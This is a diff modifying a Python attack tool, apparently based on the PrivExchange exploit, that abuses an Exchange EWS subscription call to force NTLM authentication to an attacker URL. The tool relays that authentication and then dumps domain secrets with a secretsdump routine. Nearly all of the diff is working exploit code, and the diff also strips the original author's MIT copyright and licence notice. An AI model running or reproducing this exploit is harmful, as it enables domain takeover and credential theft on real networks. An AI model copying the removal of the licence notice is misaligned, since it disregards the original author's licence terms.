@@ -1,27 +1,5 @@
-####################
-#
-# Copyright (c) 2019 Dirk-jan Mollema
-#
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to deal
-# in the Software without restriction, including without limitation the rights
-# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-# copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-#
-# The above copyright notice and this permission notice shall be included in all
-# copies or substantial portions of the Software.
-#
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-# SOFTWARE.
-#
-####################
-
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
 import ssl
 import argparse
 import logging
@@ -31,15 +9,16 @@ import base64
 import re
 import binascii
 import time
+import config
 import xml.etree.ElementTree as ET
 from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
 from impacket import ntlm
-from impacket.examples import logger
-from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
-from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
-from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
-from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
-from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
+from comm import logger
+from comm.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
+from comm.ntlmrelayx.utils.config import NTLMRelayxConfig
+from comm.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from comm.ntlmrelayx.clients import PROTOCOL_CLIENTS
+from comm.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 from multiprocessing import Manager
 from threading import Thread, Lock, currentThread
 from comm.secretsdump import DumpSecrets
@@ -47,6 +26,19 @@ from comm.secretsdump import DumpSecrets
 # Init logging
 logger.init()
 logging.getLogger().setLevel(logging.INFO)
+start = time.time()
+LOGO =R"""
+▓█████ ▒██   ██▒ ▄████▄   ██░ ██  ▄▄▄       ███▄    █   ▄████ ▓█████ 
+▓█   ▀ ▒▒ █ █ ▒░▒██▀ ▀█  ▓██░ ██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒▓█   ▀ 
+▒███   ░░  █   ░▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▒███   
+▒▓█  ▄  ░ █ █ ▒ ▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ 
+░▒████▒▒██▒ ▒██▒▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒░▒████▒
+░░ ▒░ ░▒▒ ░ ░▓ ░░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░
+ ░ ░  ░░░   ░▒ ░  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░
+   ░    ░    ░  ░         ░  ░░ ░  ░   ▒      ░   ░ ░ ░ ░   ░    ░   
+   ░  ░ ░    ░  ░ ░       ░  ░  ░      ░  ░         ░       ░    ░  ░
+                ░                                                    
+"""
 
 # SOAP request for EWS
 # Source: https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/subscribe-operation
@@ -100,25 +92,42 @@ def startServers(passargs):
         s.start()
         serverThreads.append(s)
     logging.info("Relay servers started, waiting for connection....")
-    status = exploit(passargs)
-    if status:
-        exp = Thread(target=gethash, args=(passargs,))
-        exp.daemon = True
-        exp.start()
-        try:
-            while exp.isAlive():
-                pass
-        except KeyboardInterrupt, e:
-            logging.info("Shutting down...")
+    try:
+        status = exploit(passargs)
+        if status:
+            exp = Thread(target=checkauth, args=(passargs,))
+            exp.daemon = True
+            exp.start()
+            try:
+                while exp.isAlive():
+                    pass
+            except KeyboardInterrupt, e:
+                logging.info("Shutting down...")
+                for thread in serverThreads:
+                    thread.server.shutdown()
+        else:
+            logging.error("Error in exploit, Shutting down...")
             for thread in serverThreads:
                 thread.server.shutdown()
-    else:
+    except:
         logging.error("Error in exploit, Shutting down...")
-        for thread in serverThreads:
-            thread.server.shutdown()
+        logging.info("Shutting down...")
 
 
-
+def checkauth(passargs):
+    suc = config.get_suc()
+    logging.info("Waiting for Auth...")
+    while True:
+        if suc == True:
+            gethash(passargs)
+            break
+        else:
+            suc = config.get_suc()
+            tmp = time.time() - start
+            if tmp > 120:
+                logging.error("Time Out. exiting...")
+                break
+                
 def gethash(passargs):
     remoteName = passargs.target_host
     username = passargs.user
@@ -130,18 +139,9 @@ def gethash(passargs):
     else:
         dcuser = None
     dumper = DumpSecrets(remoteName, username, password, domain,execmethod,dcuser)
-    tmp = 0
     try:
+        time.sleep(10)
         check = dumper.dump()
-        while tmp < 6:
-            tmp = tmp + 1
-            if check == True:
-                #check = dumper.dump()
-                break
-            else:
-                exploit(passargs)
-                time.sleep(10)
-                check = dumper.dump()
     except Exception, e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
@@ -166,15 +166,15 @@ def exploit(args):
             port = int(args.exchange_port)
         try:
             uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-            session = HTTPSConnection(args.host, port, context=uv_context)
+            session = HTTPSConnection(args.host, port, timeout=10,context=uv_context)
         except AttributeError:
-            session = HTTPSConnection(args.host, port)
+            session = HTTPSConnection(args.host, port, timeout=10)
     else:
         # Otherwise: HTTP
         port = 80
         if args.exchange_port:
             port = int(args.exchange_port)
-        session = HTTPConnection(args.host, port)
+        session = HTTPConnection(args.host, port, timeout=10)
 
     # Construct attacker url
     if args.attacker_port != 80:
@@ -261,7 +261,7 @@ def exploit(args):
             logging.error('Could not find response code element in body: %s', body)
             return False
         if code == 'NoError':
-            logging.info('API call was successful')
+            logging.critical('API call was successful')
             return True
         elif code == 'ErrorMissingEmailAddress':
             logging.error('The user you authenticated with does not have a mailbox associated. Try a different user.')
@@ -304,4 +304,5 @@ def main():
     startServers(passargs)
 
 if __name__ == '__main__':
+    print(LOGO)
     main()
